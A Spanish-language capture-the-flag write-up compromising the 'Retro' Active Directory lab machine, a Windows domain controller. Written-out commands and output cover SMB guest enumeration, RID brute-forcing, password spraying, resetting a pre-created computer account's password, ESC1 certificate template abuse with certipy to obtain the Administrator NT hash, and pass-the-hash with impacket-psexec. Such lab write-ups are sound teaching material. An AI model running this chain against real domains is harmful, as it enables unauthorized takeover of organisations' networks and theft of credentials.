# Resolución maquina Retro

**Autor:** PepeMaquina  
**Fecha:** 14 de enero de 2026  
**Dificultad:** Easy  
**Sistema Operativo:** Windows.  
**Tags:** SMB, UserReuse, ADCS

---
## Imagen de la Máquina

![](retro.jpg)

*Imagen: Retro.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.62.173 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,56817,57623,57636,57645,60594 10.129.62.173 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-14 20:51:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-14T20:52:36+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-14T20:52:36+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-14T20:52:36+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-01-14T20:52:36+00:00; -3s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-14T20:52:36+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-01-13T20:48:10
|_Not valid after:  2026-07-15T20:48:10
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-14T20:51:56+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
56817/tcp open  msrpc         Microsoft Windows RPC
57623/tcp open  msrpc         Microsoft Windows RPC
57636/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57645/tcp open  msrpc         Microsoft Windows RPC
60594/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-14T20:51:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
~~~
### Enumeración SMB
Como es normal en un AD, siempre se debe empezar enumerando el nombre del host junto con nombre del dominio.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/nmap]
└─$ sudo netexec smb 10.129.62.173 -u '' -p ''                                                                            
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\: 
~~~
Con ello, agregarlo al "etc/hosts"
~~~bash
┌──(kali㉿kali)-[~/htb/retro/exploits]
└─$ cat /etc/hosts | grep '10.129.62'                                                 
10.129.62.173 retro.vl dc dc.retro.vl
~~~
Finalmente como metodologia personal, intento ingresar con credenciales nulas.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/nmap]
└─$ sudo netexec smb 10.129.62.173 -u '' -p '' --shares
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\: 
SMB         10.129.62.173   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
~~~
Y luego intentar ingresar con credenciales como invitado.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/nmap]
└─$ sudo netexec smb 10.129.62.173 -u 'asd' -p '' --shares
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\asd: (Guest)
SMB         10.129.62.173   445    DC               [*] Enumerated shares
SMB         10.129.62.173   445    DC               Share           Permissions     Remark
SMB         10.129.62.173   445    DC               -----           -----------     ------
SMB         10.129.62.173   445    DC               ADMIN$                          Remote Admin
SMB         10.129.62.173   445    DC               C$                              Default share
SMB         10.129.62.173   445    DC               IPC$            READ            Remote IPC
SMB         10.129.62.173   445    DC               NETLOGON                        Logon server share 
SMB         10.129.62.173   445    DC               Notes                           
SMB         10.129.62.173   445    DC               SYSVOL                          Logon server share 
SMB         10.129.62.173   445    DC               Trainees        READ      
~~~
Esto si dio resultado, tambien se puede ver una carpeta a la que se tiene acceso de lectura, por lo que se ingresa a el.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ smbclient -U '123' //10.129.62.173/Trainees    
Password for [WORKGROUP\123]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

                4659711 blocks of size 4096. 1307820 blocks available
smb: \> get Important.txt 
getting file \Important.txt of size 288 as Important.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> exit
~~~
Dentro del recurso compartido se ve un archivo "Important.txt" asi que se procede a descargarlo y leerlo.
~~~txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins  
~~~
Es simplemente un mensaje que habla sobre la seguridad de contraseñas, dando a entender que posiblemente existan contraseñas inseguras en algunos usuarios.

Antes que nada, se procede a realizar la enumeración de usuarios.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ sudo netexec smb 10.129.62.173 -u 'asd' -p '' --rid-brute
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\asd: (Guest)
SMB         10.129.62.173   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.62.173   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.62.173   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.62.173   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.62.173   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.62.173   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.62.173   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.62.173   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.62.173   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.62.173   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.62.173   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.62.173   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.62.173   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.62.173   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.62.173   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.62.173   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.62.173   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.62.173   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.62.173   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.62.173   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.62.173   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.62.173   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.62.173   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.62.173   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.62.173   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.62.173   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.62.173   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.62.173   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.62.173   445    DC               1109: RETRO\tblack (SidTypeUser)
~~~
De toda la informacion se agruparon unicamente los usuarios viendo que tambien existe una maquina que podria llegar a ser util para ataques como timeroast en un futuro.

En este punto, siguiendo mi metodologia primero se intento un asproastAtack pero no dio resultado, no se puede hacer kerberoasting asi que lo ultimo es realizar una busqueda de credencales validas probando usuarios como contraseñas.
~~~bash
┌──(kali㉿kali)-[~/htb/retro]
└─$ sudo netexec smb 10.129.62.173 -u users -p users --continue-on-success 
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack:administrator STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley:administrator STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\trainee:administrator STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:administrator STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [+] retro.vl\:administrator (Guest)
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator:tblack STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley:tblack STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\trainee:tblack STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:tblack STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator:jburley STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack:jburley STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\trainee:jburley STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:jburley STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator:trainee STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack:trainee STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley:trainee STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:trainee STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\administrator: STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\tblack: STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\jburley: STATUS_LOGON_FAILURE 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$: STATUS_LOGON_FAILURE 
~~~
Efectivamente si surgio efecto, se tiene acceso al usuario "trainee".
Viendo su contenido en SMB.
~~~bash
┌──(kali㉿kali)-[~/htb/retro]
└─$ sudo netexec smb 10.129.62.173 -u 'trainee' -p 'trainee' --shares
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.62.173   445    DC               [*] Enumerated shares
SMB         10.129.62.173   445    DC               Share           Permissions     Remark
SMB         10.129.62.173   445    DC               -----           -----------     ------
SMB         10.129.62.173   445    DC               ADMIN$                          Remote Admin
SMB         10.129.62.173   445    DC               C$                              Default share
SMB         10.129.62.173   445    DC               IPC$            READ            Remote IPC
SMB         10.129.62.173   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.62.173   445    DC               Notes           READ            
SMB         10.129.62.173   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.62.173   445    DC               Trainees        READ         
~~~
Este tiene acceso a un recurso "Notes", asi que se entra a ella.
~~~bash
┌──(kali㉿kali)-[~/htb/retro]
└─$ smbclient -U 'trainee' //10.129.62.173/Notes                  
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  8 23:12:49 2025
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 18:05:56 2023
  user.txt                            A       32  Tue Apr  8 23:13:01 2025

                4659711 blocks of size 4096. 1325381 blocks available
smb: \> get user.txt 
getting file \user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get ToDo.txt 
getting file \ToDo.txt of size 248 as ToDo.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
~~~
Se ven dos archivos y se los descarga. Uno de ellos ya viene a ser la flag.

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Se ve el archivo para poder leer la flag.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ cat user.txt 
cbda362cff2099072c5e96c51712ff33 
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios se lee el archivo descargado.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ cat ToDo.txt     
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James  
~~~
Esto menciona un software viejo y que existe una cuenta de computadora que deberia de eliminar, esta posiblemente sea la cuenta que se encontro en un principio "BANKING$".
Para enumerarlo se debe recordar que por lo general la contraseña por defecto de las computadoras es su mismo nombre pero en minusculas.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ sudo netexec smb 10.129.62.173 -u 'BANKING$' -p 'banking' 
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
~~~
Al intentar ver la existencia del usuario, este entrega un mensaje distinto al inicio de sesion fallido "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT".
Averiguando el significado del mensaje en internet, se encontro con un articulo (https://trustedsec.com/blog/diving-into-pre-created-computer-accounts) donde menciona que viene se equipos heredados con windows pre2000.
Esto tambien menciona que este error es por equipos que no estan siendo usados y sugiere cambiar la contraseña para que ahora si se habilite.
Para esto utiliza el script "rpcchangepwd.py" (https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py).
~~~bash
┌──(kali㉿kali)-[~/htb/retro/exploits]
└─$ python3 rpcchangepwd.py retro.vl/BANKING\$:banking@10.129.62.173 -newpass 'Password123!'
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Password was changed successfully.
~~~
Con la contraseña cambiada ahora si se tiene acceso total a la maquina.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ sudo netexec smb 10.129.62.173 -u 'BANKING$' -p 'Password123!'
[sudo] password for kali: 
SMB         10.129.62.173   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.62.173   445    DC               [+] retro.vl\BANKING$:Password123! 
~~~

### ESC1
Tras realizar enumeración manual se se que no tiene mucha información, asi que es turno de certipy.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ certipy-ad find -u 'BANKING$' -p 'Password123!' -target 10.129.62.173 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
~~~
Esta cuenta con un template vulnerable, asi que se intenta confirmar y vulnerar el template con el buen ly4k (https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ certipy-ad req -u 'BANKING$@retro.vl' -p 'Password123!' -dc-ip 10.129.62.173 -target 10.129.62.173 -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): n
[-] Failed to request certificate
~~~
Al intentar obtener el pfx de administrator ocurre un error, parece ser un error de tamaños, ya que por defecto certipy tira llaves de 2048, y al parecer este servidor espera otro tamaño (lo mas normal es 4096).
Por suerte certipy tiene una opcion para ajustarlo.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ certipy-ad req -u 'BANKING$' -p 'Password123!' -dc-ip '10.129.62.173' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~~~
Ahora si se pudo obtener el pfx de administrator, ahora es cosa de obtener su hash NTLM.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.62.173'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
~~~
Y si se obtuvo su hash NTLM.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Ahora que ya se su NTLM, es cosa de ingresar por psexec y ver la flag.
~~~bash
┌──(kali㉿kali)-[~/htb/retro/content]
└─$ impacket-psexec administrator@10.129.62.173 -hashes :252fac7066d93dd009d4fd2cd0368389
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.62.173.....
[*] Found writable share ADMIN$
[*] Uploading file fRBDiMMs.exe
[*] Opening SVCManager on 10.129.62.173.....
[*] Creating service fxaS on 10.129.62.173.....
[*] Starting service fxaS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\Administrator\Desktop> type c:\users\administrator\desktop\root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

